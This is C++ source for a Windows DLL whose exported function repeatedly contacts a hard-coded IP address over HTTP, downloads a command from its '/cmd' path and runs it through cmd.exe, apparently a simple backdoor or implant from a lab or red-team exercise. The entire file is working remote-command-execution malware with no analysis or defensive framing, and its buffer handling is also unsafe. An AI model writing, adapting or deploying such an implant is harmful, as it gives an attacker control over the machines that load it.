// dllmain.cpp : Defines the entry point for the DLL application.
#include "pch.h"
#include <Windows.h>
#include <cstring>
#include <winhttp.h>
#include <cstdio>
#include <stdlib.h>

//#define WIN32_LEAN_AND_MEAN
#pragma comment(lib, "winhttp.lib")
extern "C" void __declspec(dllexport) WINAPI doStuff() {
	DWORD dwSize = 0;
	DWORD dwDownloaded = 0;
	DWORD dwProcessId;
	LPSTR pszDecrypt;
	LPSTR pszOutBuffer;
	BOOL  bResults = FALSE;
	HINTERNET  hSession = NULL,
		hConnect = NULL,
		hRequest = NULL;
	LPCWSTR lpHostName = L"192.168.138.145";
	LPCWSTR lpCommandString = L"/cmd";
	while (!bResults) {
		printf("\n1 mojo\n");

		// Use WinHttpOpen to obtain a session handle.
		hSession = WinHttpOpen(L"WinHTTP Example/1.0",
			WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
			WINHTTP_NO_PROXY_NAME,
			WINHTTP_NO_PROXY_BYPASS, 0);
		//printf("\n http open last err: 0x%x\n", GetLastError());
		printf("\n2 mojo\n");
		// Specify an HTTP server.
		if (hSession)
			hConnect = WinHttpConnect(hSession,lpHostName,
				80, 0);

		//printf("\n connect last err: 0x%x\n", GetLastError());
		printf("\n3 mojo\n");
		// Create an HTTP request handle.
		if (hConnect)
			hRequest = WinHttpOpenRequest(hConnect, L"GET",lpCommandString,
				NULL, WINHTTP_NO_REFERER,
				WINHTTP_DEFAULT_ACCEPT_TYPES,
				NULL
				//WINHTTP_FLAG_SECURE
			);
		//printf("\n open req last err: 0x%x\n", GetLastError());
		printf("\n4 mojo\n");
		// Send a request.
		if (hRequest) {
			bResults = WinHttpSendRequest(hRequest,
				WINHTTP_NO_ADDITIONAL_HEADERS, 0,
				WINHTTP_NO_REQUEST_DATA, 0,
				0, 0);

		}
		//printf("\n send req last err: 0x%x\n", GetLastError());
		// End the request.
		if (bResults) {
			bResults = WinHttpReceiveResponse(hRequest, NULL);
		}
		else {
			WinHttpCloseHandle(hRequest);
			WinHttpCloseHandle(hConnect);
			WinHttpCloseHandle(hSession);
		}
	}
	printf("\n5 mojo\n");
	//pszOutCompleteBuffer =new char[4096];
	int iOffset = 0;

	char* lpToExec = new char[500];
	// Keep checking for data until there is nothing left.
	printf("got here!!!\n");
	if (bResults)
	{
		do
		{
			// Check for available data.
			dwSize = 0;
			if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) {
				printf("Error %u in WinHttpQueryDataAvailable.\n",
					GetLastError());
			}

			// Allocate space for the buffer.
			pszOutBuffer = new char[dwSize + 1];
			if (!pszOutBuffer)
			{
				printf("Out of memory\n");
				dwSize = 0;
			}
			else
			{
				// Read the data.
				ZeroMemory(pszOutBuffer, dwSize + 1);

				if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer, dwSize, &dwDownloaded))
				{
					printf("Error %u in WinHttpReadData.\n", GetLastError());

				}
				else
				{
					printf("%s", pszOutBuffer);
					//ReadFile(hRequest, &lpToExec[iOffset], dwSize+1, NULL, NULL)
					// could also go with virtual alloc
					std::memcpy((LPVOID)(((char*)lpToExec + iOffset)), pszOutBuffer, dwSize);
					//sprintf_s(pszOutCompleteBuffer+iOffset-dwSize, sizeof(pszOutBuffer), "%s", pszOutBuffer);
				}
				// Free the memory allocated to the buffer.
				delete[] pszOutBuffer;
				iOffset += dwSize;
			}
		} while (dwSize > 0);
	}
	char cmd[50];
	strcpy_s(cmd, sizeof("C:\\windows\\system32\\cmd.exe /c "), "C:\\windows\\system32\\cmd.exe /c ");
	int x = strlen(lpToExec) + 1;
	strcat_s(cmd, sizeof(cmd), lpToExec);
	FILE* fCmd = _popen(cmd, "r");
	char response[1024];
	printf("before fgets");
	fgets(response, sizeof(response), fCmd);
	printf(response);


	_pclose(fCmd);
	Sleep(1000);
	if (!bResults)
		printf("Error %d has occurred.\n", GetLastError());

	// Close any open handles.
	if (hRequest) WinHttpCloseHandle(hRequest);
	if (hConnect) WinHttpCloseHandle(hConnect);
	if (hSession) WinHttpCloseHandle(hSession);

	return;
}


BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	

	return TRUE;
}
